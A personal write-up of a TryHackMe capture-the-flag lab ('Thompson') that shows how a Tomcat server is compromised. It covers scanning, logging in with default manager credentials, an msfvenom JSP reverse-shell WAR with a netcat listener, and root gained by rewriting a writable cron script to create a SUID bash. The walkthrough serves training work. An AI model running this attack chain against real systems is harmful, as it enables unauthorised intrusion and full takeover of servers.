---
title: "TryHackMe Lab Walkthrough: Thompson"
date: 2025-12-26
categories: [TryHackMe, Web Exploitation]
tags: [tomcat, war, reverse-shell, cron, privilege-escalation, beginner-friendly]
---

## Introduction

In this lab, I explored a vulnerable machine running **Apache Tomcat**.

The goal was simple — enumerate the services, find a way in and finally gain root access.

---

## Step 1: Initial Enumeration with Nmap

I started with a basic **Nmap scan** to see which ports were open on the target.
```bash
nmap -sC -sV -oA nmap/thompson 10.48.131.1
```

From the scan results, I noticed:

- **Port 22** – SSH
- **Port 8009** – AJP
- **Port 8080** – HTTP (Apache Tomcat)

Seeing **Tomcat on port 8080** immediately caught my attention because Tomcat is often misconfigured in labs.

![Nmap Scan Results](/assets/img/posts/thompson/nmap-scan.png)
_Nmap scan showing open ports_

---

## Step 2: Checking the Web Application

Next, I opened the web service in the browser:
```
http://10.48.131.1:8080
```

This showed the **default Apache Tomcat 8.5.5 page**.

This confirmed:
- ✅ Tomcat is installed
- ✅ The default page is exposed
- ✅ The server might not be hardened properly

![Tomcat Homepage](/assets/img/posts/thompson/tomcat-homepage.png)
_Apache Tomcat default page_

---

## Step 3: Directory Enumeration with Gobuster

After confirming Tomcat, I ran **Gobuster** to find hidden directories.
```bash
gobuster dir -u http://10.48.131.1:8080 -w /usr/share/wordlists/dirb/common.txt
```

Gobuster revealed some interesting paths:
- `/manager`
- `/host-manager`
- `/docs`
- `/examples`

The **/manager** path is very important in Tomcat labs.

![Gobuster Results](/assets/img/posts/thompson/gobuster-scan.png)
_Gobuster discovering Tomcat directories_

---

## Step 4: Accessing Tomcat Manager

When I visited:
```
http://10.48.131.1:8080/manager
```

I got a **401 Unauthorized** login prompt.

I also tried:
```
/manager/html
```

Still unauthorized — but here's the interesting part 👀

When I **cancelled the login prompt**, the page still displayed useful information, including:
- Where credentials are stored
- Example username and role format

This was an **information leak**.

By carefully observing this response, I was able to identify valid manager credentials.

![401 Unauthorized Page](/assets/img/posts/thompson/401-unauthorized.png)
_Information disclosure in error page_

---

## Step 5: Logging into Tomcat Manager

Using the discovered credentials, I successfully logged into the **Tomcat Manager dashboard**.

**Credentials used:**
- Username: `tomcat`
- Password: `s3cret`

Once inside, I could see:
- Running applications
- Options to upload WAR files

This is usually **game over** for Tomcat boxes 😄

![Tomcat Manager Dashboard](/assets/img/posts/thompson/manager-dashboard.png)
_Inside the Tomcat Manager interface_

---

## Step 6: Creating a Malicious WAR File

Now the plan was clear — upload a **malicious WAR file** to get a reverse shell.

I created the payload using **msfvenom**:
```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.48.76.76 \
  LPORT=4433 \
  -f war \
  -o exploit.war
```

Then I started a **listener**:
```bash
nc -lvnp 4433
```

![Msfvenom Payload Creation](/assets/img/posts/thompson/msfvenom-payload.png)
_Creating the malicious WAR file_

---

## Step 7: Getting the Reverse Shell

After uploading and deploying the WAR file from Tomcat Manager, the target connected back to my listener.

🎉 **Shell received!**

I now had access to the system and started exploring.

![Reverse Shell Connection](/assets/img/posts/thompson/reverse-shell.png)
_Successfully obtained reverse shell as tomcat user_
```bash
whoami
# tomcat

id
# uid=1001(tomcat) gid=1001(tomcat)
```

---

## Step 8: Exploring the System

Inside `/home`, I found a user named **jack** and the file:
```bash
ls /home
# jack

ls /home/jack
# test.txt  user.txt
```

I also confirmed my access level and checked system users.

At this point, I noticed something interesting in the system's **cron jobs**.

![System Exploration](/assets/img/posts/thompson/system-exploration.png)
_Exploring the file system_

---

## Step 9: Cron Job Privilege Escalation

Checking `/etc/crontab`, I found this line:
```bash
cat /etc/crontab
```
```
* * * * * root cd /home/jack && bash id.sh
```

This means:
- A script `id.sh` inside `/home/jack`
- **Runs every minute**
- **Runs as root** ⚠️

Even worse — **the script was writable**.
```bash
ls -la /home/jack/id.sh
# -rwxrwxrwx 1 jack jack 26 Aug 14 2019 /home/jack/id.sh
```

This is a **classic cron misconfiguration**.

![Crontab Contents](/assets/img/posts/thompson/crontab-contents.png)
_Discovering the vulnerable cron job_

---

## Step 10: Escalating to Root

I modified `id.sh` to create a **SUID root bash**:
```bash
echo '#!/bin/bash' > /home/jack/id.sh
echo 'cp /bin/bash /tmp/rootbash' >> /home/jack/id.sh
echo 'chmod +s /tmp/rootbash' >> /home/jack/id.sh
```

After **cron executed it** (waited ~60 seconds), I ran:
```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash

/tmp/rootbash -p
```

And confirmed:
```bash
whoami
# root

id
# uid=1001(tomcat) euid=0(root)
```

✅ **Root access achieved!**

![Root Privilege Escalation](/assets/img/posts/thompson/root-escalation.png)
_Successfully escalated to root_

---

## Step 11: Capturing the Flags

### User Flag
```bash
cat /home/jack/user.txt
# fe0e8b4[REDACTED]
```

### Root Flag

Finally, I navigated to `/root` and read:
```bash
cat /root/root.txt
# d89d539[REDACTED]
```

Both **user and root flags** were captured successfully! 🎉

![Root Flag](/assets/img/posts/thompson/root-flag.png)
_Final proof: root flag captured_

---

## Key Learnings

✅ **Always enumerate web services deeply**  
✅ **Tomcat Manager access can lead to full compromise**  
✅ **Error messages can leak sensitive information**  
✅ **Misconfigured cron jobs are very dangerous**  
✅ **Small mistakes chain into full root access**

---

## Attack Chain Summary
```
1. Nmap Scan → Found Tomcat on port 8080
2. Gobuster → Discovered /manager endpoint
3. Information Disclosure → Found credentials
4. Tomcat Manager Access → Uploaded malicious WAR
5. Reverse Shell → Got shell as tomcat user
6. Enumeration → Found writable cron job
7. Cron Exploitation → Created SUID bash
8. Root Access → Captured both flags
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **Nmap** | Port scanning and service enumeration |
| **Gobuster** | Directory enumeration |
| **msfvenom** | Malicious WAR file generation |
| **Netcat** | Reverse shell listener |
| **Bash** | Shell scripting and exploitation |

---

## Final Thoughts

This lab was a great example of how:

1. **Enumeration** leads to discovery
2. **Discovery** leads to exploitation
3. **Exploitation** leads to privilege escalation

Everything followed a **logical attacker mindset**, and no advanced tricks were needed — just patience and observation.

---

## Additional Resources

- [TryHackMe: Thompson Room](https://tryhackme.com/room/thompson)
- [Apache Tomcat Documentation](https://tomcat.apache.org/)
- [OWASP: Tomcat Security](https://owasp.org/www-project-web-security-testing-guide/)
- [GTFOBins: SUID Exploitation](https://gtfobins.github.io/)

---

**Thanks for reading!** 🚀

If you found this helpful, feel free to connect:
- GitHub: [@gladigator](https://github.com/gladigator)
- LinkedIn: [Loganathan Mani](https://www.linkedin.com/in/loganathan-mani/)

**Happy hacking and keep learning!** 🔒

---

#TryHackMe #WebExploitation #ApacheTomcat #PrivilegeEscalation #CronJobs #CTF #Pentesting
```
